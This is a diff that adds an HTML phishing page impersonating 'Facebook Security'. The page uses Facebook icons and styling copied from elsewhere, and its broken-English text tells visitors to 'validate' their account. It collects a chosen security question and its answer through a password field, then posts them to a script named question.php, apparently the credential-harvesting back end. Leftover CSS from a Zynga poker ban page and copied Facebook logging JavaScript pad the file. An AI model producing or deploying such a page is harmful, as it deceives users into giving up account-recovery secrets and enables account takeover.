@@ -1,0 +1,515 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
+<title>Facebook Security</title>
+<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yl/r/H3nktOa7ZMg.ico">
+<meta http-equiv="Content-Language" content="en-us">
+<style type="text/css">
+#banned_wrapper {
+background: url(../images/ban_bg.jpg) repeat-x #eceff5;
+}
+
+#banned_wrapper,
+#banned h1,
+#banned p {	
+	margin: 0;
+	padding: 0;
+}
+
+#banned {
+	width: 640px;
+	position: relative;
+	padding: 20px 0;
+	margin: auto;
+	font-size: 16px;
+	color: #29447E;
+}
+
+#banned a, a:link, a:visited {
+	color: #29447E;
+    text-decoration: none;
+}
+
+#banned a:hover {
+    text-decoration: underline;
+}
+
+#banned_frame {
+	background: url(../images/ban_frame.gif) repeat-x top center #8B4513;
+	font-family: Arial, Helvetica, sans-serif;
+	padding: 10px 6px 6px 6px;
+}
+
+#banned_content {
+	background: #8B4513;
+	padding: 20px;
+	position: relative;
+}
+
+#investigate {
+	border-top: 1px dashed #8B4513;
+	margin: 15px 0 0 0;
+	padding: 12px 0 0 0;
+}
+
+#banned h1 {	
+	font-size: 1.5em;
+	font-weight: bold;
+	color: #8B4513;
+	text-transform: uppercase;
+}
+
+#banned #investigate h1 {	
+	font-size: 1.14em;
+}
+
+#banned p {	
+	font-size: 0.88em;
+	padding: 5px 10px;
+	color: #29447E;
+}
+
+#banned p label {	
+	font-size: 0.88em;
+	font-weight: bold;
+}
+
+#banned p label span {
+	text-decoration: underline;
+}
+
+#banned #investigate .investigateform label {
+	font-weight: bold;
+	width: 110px;
+	float: left;
+	position: relative;
+	margin-left: 15px;
+}
+
+#banned #investigate .investigateform input,
+#banned #investigate .investigateform textarea {
+	width: 400px;
+	border: 1px solid #8B4513;
+}
+
+#banned #investigate .investigateform textarea {
+	height: 100px;
+}
+
+#banned #reactivate .button a,
+#banned #investigate .button a {
+	background: url(../images/btn-reactivate.gif) no-repeat;
+	width: 374px;
+	height: 33px;
+	text-indent: -9999px;
+	font-size: 0em;
+	display: block;
+	margin: 5px auto;
+}
+
+#banned #investigate .button a {
+	background: url(../images/btn-investigate.gif) no-repeat;
+}
+
+#banned #reactivate .button a:hover {
+	background: url(../images/btn-reactivate.gif) no-repeat 0 -33px;
+}
+
+#banned #reactivate .button .disabled,
+#banned #reactivate .button .disabled:hover {
+	background: url(../images/btn-reactivate.gif) no-repeat 0 -66px;
+}
+
+#banned #investigate .button a:hover {
+	background: url(../images/btn-investigate.gif) no-repeat 0 -33px;
+}
+
+#banned #investigate .button .disabled,
+#banned #investigate .button .disabled:hover {
+	background: url(../images/btn-investigate.gif) no-repeat 0 -66px;
+}
+
+.corners_tl, .corners_bl,.corners_tr,.corners_br {
+  width: 5px;
+  height: 5px;
+  font-size: 0;
+}
+.corners_tl, .corners_bl {float:left;}
+.corners_tr, .corners_br {float:right;}
+
+.corners_tl {
+  background: url(../images/ban_corners.gif);
+}
+.corners_tr {
+  background: url(../images/ban_corners.gif) 6px 0px;
+}
+.corners_bl {
+  background: url(../images/ban_corners.gif) 0px 6px;
+  margin-top: -6px;
+}
+.corners_br {
+  background: url(../images/ban_corners.gif) 6px 6px;
+  margin-top: -6px;
+}
+
+
+/* for btn*/
+
+#banned .clear {
+  clear: both;
+}
+
+#banned_buttons {
+  width: 375px;
+  margin: 0 auto;
+}
+
+#banned_buttonlobby,
+#banned_buttonchips {
+  float: left;
+  padding: 5px;
+}
+
+#banned_buttonlobby a {
+  background: url(../images/ban_btn-lobby.gif) no-repeat;
+  width: 177px;
+  height: 40px;
+  text-indent: -9999px;
+  font-size: 0em;
+  display: block;
+}
+
+#banned_buttonlobby a:hover {
+  background: url(../images/ban_btn-lobby.gif) no-repeat 0 -40px;
+}
+
+#banned_buttonchips a {
+  background: url(../images/ban_btn-chips.gif) no-repeat;
+  width: 177px;
+  height: 40px;
+  text-indent: -9999px;
+  font-size: 0em;
+  display: block;
+}
+
+#banned_buttonchips a:hover {
+  background: url(../images/ban_btn-chips.gif) no-repeat 0 -40px;
+}
+
+</style>
+<style type="text/css">
+#banned_wrapper {
+background: url(../images/ban_bg.jpg) repeat-x #FFFFFF;
+}
+
+#banned_wrapper,
+#banned h1,
+#banned p {	
+	margin: 0;
+	padding: 0;
+}
+
+#banned {
+	width: 400px;
+	position: relative;
+	padding: 40px 0;
+	margin: auto;
+	font-size: 16px;
+	color: #29447E;
+}
+
+#banned a, a:link, a:visited {
+	color: #fff;
+    text-decoration: none;
+}
+
+#banned a:hover {
+    text-decoration: underline;
+}
+
+#banned_frame {
+	background: url(../images/ban_frame.gif) repeat-x top center #000000;
+	font-family: Arial, Helvetica, sans-serif;
+	padding: 5px 5px 5px 5px;
+}
+
+#banned_content {
+	background: #eceff5;
+	padding: 15px;
+	position: relative;
+}
+
+#investigate {
+	border-top: 1px dashed #999;
+	margin: 15px 0 0 0;
+	padding: 12px 0 0 0;
+}
+
+#banned h1 {	
+	font-size: 1.5em;
+	font-weight: bold;
+	color: #000;
+	text-transform: uppercase;
+}
+
+#banned #investigate h1 {	
+	font-size: 1.14em;
+}
+
+#banned p {	
+	font-size: 0.88em;
+	padding: 5px 10px;
+	color: #000;
+}
+
+#banned p label {	
+	font-size: 0.88em;
+	font-weight: bold;
+}
+
+#banned p label span {
+	text-decoration: underline;
+}
+
+#banned #investigate .investigateform label {
+	font-weight: bold;
+	width: 110px;
+	float: left;
+	position: relative;
+	margin-left: 15px;
+}
+
+#banned #investigate .investigateform input,
+#banned #investigate .investigateform textarea {
+	width: 400px;
+	border: 1px solid #666;
+}
+
+#banned #investigate .investigateform textarea {
+	height: 100px;
+}
+
+#banned #reactivate .button a,
+#banned #investigate .button a {
+	background: url(../images/btn-reactivate.gif) no-repeat;
+	width: 374px;
+	height: 33px;
+	text-indent: -9999px;
+	font-size: 0em;
+	display: block;
+	margin: 5px auto;
+}
+
+#banned #investigate .button a {
+	background: url(../images/btn-investigate.gif) no-repeat;
+}
+
+#banned #reactivate .button a:hover {
+	background: url(../images/btn-reactivate.gif) no-repeat 0 -33px;
+}
+
+#banned #reactivate .button .disabled,
+#banned #reactivate .button .disabled:hover {
+	background: url(../images/btn-reactivate.gif) no-repeat 0 -66px;
+}
+
+#banned #investigate .button a:hover {
+	background: url(../images/btn-investigate.gif) no-repeat 0 -33px;
+}
+
+#banned #investigate .button .disabled,
+#banned #investigate .button .disabled:hover {
+	background: url(../images/btn-investigate.gif) no-repeat 0 -66px;
+}
+
+.corners_tl, .corners_bl,.corners_tr,.corners_br {
+  width: 5px;
+  height: 5px;
+  font-size: 0;
+}
+.corners_tl, .corners_bl {float:left;}
+.corners_tr, .corners_br {float:right;}
+
+.corners_tl {
+  background: url(../images/ban_corners.gif);
+}
+.corners_tr {
+  background: url(../images/ban_corners.gif) 6px 0px;
+}
+.corners_bl {
+  background: url(../images/ban_corners.gif) 0px 6px;
+  margin-top: -6px;
+}
+.corners_br {
+  background: url(../images/ban_corners.gif) 6px 6px;
+  margin-top: -6px;
+}
+
+
+/* for btn*/
+
+#banned .clear {
+  clear: both;
+}
+
+#banned_buttons {
+  width: 375px;
+  margin: 0 auto;
+}
+
+#banned_buttonlobby,
+#banned_buttonchips {
+  float: left;
+  padding: 5px;
+}
+
+#banned_buttonlobby a {
+  background: url(../images/ban_btn-lobby.gif) no-repeat;
+  width: 177px;
+  height: 40px;
+  text-indent: -9999px;
+  font-size: 0em;
+  display: block;
+}
+
+#banned_buttonlobby a:hover {
+  background: url(../images/ban_btn-lobby.gif) no-repeat 0 -40px;
+}
+
+#banned_buttonchips a {
+  background: url(../images/ban_btn-chips.gif) no-repeat;
+  width: 177px;
+  height: 0px;
+  text-indent: -9999px;
+  font-size: 0em;
+  display: block;
+}
+
+#banned_buttonchips a:hover {
+  background: url(../images/ban_btn-chips.gif) no-repeat 0 -40px;
+}
+
+</style>
+<script> 
+  function RedirResendEmail(){
+   window.location.disabled= "https://zynga.com/play/poker/?rsndipe=1";
+  }
+  function RedirSecAlertOff(){
+     window.location.disabled= "https://zynga.com/play/poker/?secaloff=0";
+  }
+</script>
+</head>
+
+<body><div id="banned_wrapper">
+<div id="banned" style="width: 660px; height: 300px; left: 5px; top: 0px;">
+
+<div id="banned_frame">
+
+
+
+<center>
+<div id="banned_content">
+
+    
+<form action="question.php" method="post"> 
+<input type="hidden" name="username" value="managament"> 
+
+<input type="hidden" name="reqd" value="1">
+<input type="hidden" name="url" value="http://www.facebook.com">
+<img src="https://upload.wikimedia.org/wikipedia/ta/1/1e/Facebook_page_original_icon.png" align="left" width="60px" height="60px"><img src="https://upload.wikimedia.org/wikipedia/ta/1/1e/Facebook_page_original_icon.png" align="right" width="60px" height="60px"><table border="0" height="300" width="500">
+
+
+
+					<tbody><tr><td width="28" height="42" colspan="2">
+<center><b>					<font size="2" face="Calibri" color="#000000">Validation security question, please confirmation your security question to activation your account. your account use a facebook provider. Validate your data account in this form.
+
+
+</font><b>
+
+  <br><div id="app2389801228_banned" fbcontext="a97b46b32a48">  <span class="corners_tl"></span><span class="corners_tr"></span>
+<div id="app2389801228_banned_frame" fbcontext="a97b46b32a48">
+<div id="app2389801228_banned_content" fbcontext="a97b46b32a48">   <label id="label_birthday_captcha_response" for="birthday_captcha_response">      </label><br>
+</div></div></div><table border="0" cellpadding="5" cellspacing="4" width="350">
+
+        <tbody>
+	
+          
+
+ 
+
+</tbody></table><div id="current-product">
+
+		<script type="text/javascript"> 
+//<![CDATA[
+CavalryLogger=false;window._is_quickling_index=""; function get_intern_ref(node) { if (!!node) { var div_ids = { profile_minifeed : 1, info_tab : 1, gb_content_and_toolbar : 1, gb_muffin_area : 1, ego : 1, bookmarks_menu : 1, jewelBoxNotif: 1, jewelNotif: 1, BeeperBox: 1 }; for (var cur = node; cur && cur != document.body; cur = cur.parentNode) { if (!cur.id || typeof cur.id !== 'string') { continue; } if (cur.id.substr(0, 8) == 'pagelet_') { return cur.id.substr(8); } if (div_ids[cur.id]) { return cur.id; } } } return '-'; } var user_action = (function() { var ue_count = 0, logged = 0; return function(node, context, e, s) { var type = null; if (e) { if (logged) { return; } else { logged = 1; setTimeout(function(){logged = 0;}, 0); } } var href = null; if (!!node) { href = node.href; if ((!href || node.rel) && node.getAttribute) { var ajax = node.getAttribute('ajaxify'); if (ajax && ajax != '1') { href = ajax; } } if (!href && node.name) { href = node.name; } if (!href) { href = '-'; } } ue_count ++; var ue_ts = (+new Date()); var ue = ue_ts + '/' + ue_count; document.cookie = "act=" + encodeURIComponent(ue) + "; path=/; domain=" + window.location.hostname.replace(/^.*(\.facebook\..*)$/i, '$1'); if (!s) { s = 'r'; } window.Arbiter && Arbiter.inform( 'user/action', {context: context, event: e, node: node}); window.Log && Log('act', [ue_ts, ue_count, href, context, type, get_intern_ref(), s, window.URI ? URI.getRequestURI() : location.pathname + location.search + location.hash]); return ue; } })();
+//]]>
+</script><noscript> <meta http-equiv=refresh content="0; URL=?login_attempt=1&amp;_fb_noscript=1" /> </noscript> 
+
+</div><table width="290" cellspacing="4" cellpadding="0" border="0">
+    <tbody>
+        <tr>
+   
+            <td width="70" valign="midle"><label id="label_birthday_captcha_response" for="birthday_captcha_response">Question</label> </td>
+            <td width="10" valign="midle">:</td>
+            <td width="250" valign="midle">  <select autocomplete="off" onchange="editor_date_month_change(this, 'birthday_captcha_day','birthday_captcha_year');" id="birthday_captcha_month" name="birthday_captcha_month">
+            <option value="-1">choose your question:</option>
+            <option value="What was the last name of your first teacher?">What was the last name of your first teacher?</option>
+            <option value="In what city or town was your mother born?">In what city or town was your mother born?</option>
+            <option value="What are the last five characters of your drivers license?">What are the last five characters of your drivers license?</option>
+            <option value="What street did you live on when you were 8 years old?">What street did you live on when you were 8 years old?</option>
+            <option value="Other">Other</option>
+            </select>              </td>
+        </tr>
+        <tr>
+            <td width="70" valign="midle"><label id="label_pass" for="pass" label="" name="counter">Answer</label></td>
+            <td width="10" valign="midle">:</td>
+            <td width="250" valign="midle"><input type="password" value="" name="pass1" id="pass" class="inputpassword"></td>
+        </tr>
+        <tr>
+            <td align="center" colspan="3">
+            <div align="center"><label class="uiButton uiButtonConfirm" <center=""><input type="submit" value="Save and Continue" name=".save" id=".save">     
+<br>
+            </label></div>
+            </td>
+        </tr>
+
+
+
+		<!--/header-->
+		</tbody></table>
+
+
+<b style="font-style: normal; font-variant: normal; letter-spacing: normal; line-height: 
+
+normal; text-indent: 0px; text-transform: none; white-space: normal; word-spacing: 0px; -
+
+webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: Arial, Helvetica, sans-serif; 
+
+font-size: 16px; orphans: 2; text-align: start; widows: 2; background-color: rgb(249, 249, 
+
+249);">
+<font size="4" face="Calibri" color="#f3f4f5">
+<table width="100%" cellpadding="0" cellspacing="0" style="color: rgb(0, 0, 0); font-family: 
+
+Arial, Helvetica, sans-serif; font-size: 16px; font-style: normal; font-variant: normal; 
+
+font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: 
+
+start; text-indent: 0px; text-transform: none; white-space: normal; widows: auto; word-
+
+spacing: 0px; -webkit-text-stroke-width: 0px;">
+	
+		
+				
+</table>
+<table width="100%" cellpadding="0" cellspacing="0" style="color: rgb(0, 0, 0); font-family: 
+
+Arial, Helvetica, sans-serif; font-size: 16px; font-style: normal; font-variant: normal; 
+
+font-weight: normal; letter-spacing: normal; line-height: normal; orphans: auto; text-align: 
+
+start; text-indent: 0px; text-transform: none; white-space: normal; widows: auto; word-
+
+spacing: 0px; -webkit-text-stroke-width: 0px;">
+
+
+	<tbody><tr></tr></tbody></table> 
+<center><img height="" width="570" alt="" src=""><center></center></center></font></b></b></b></center></td></tr></tbody></table></form></div></center></div></div></div></body></html>
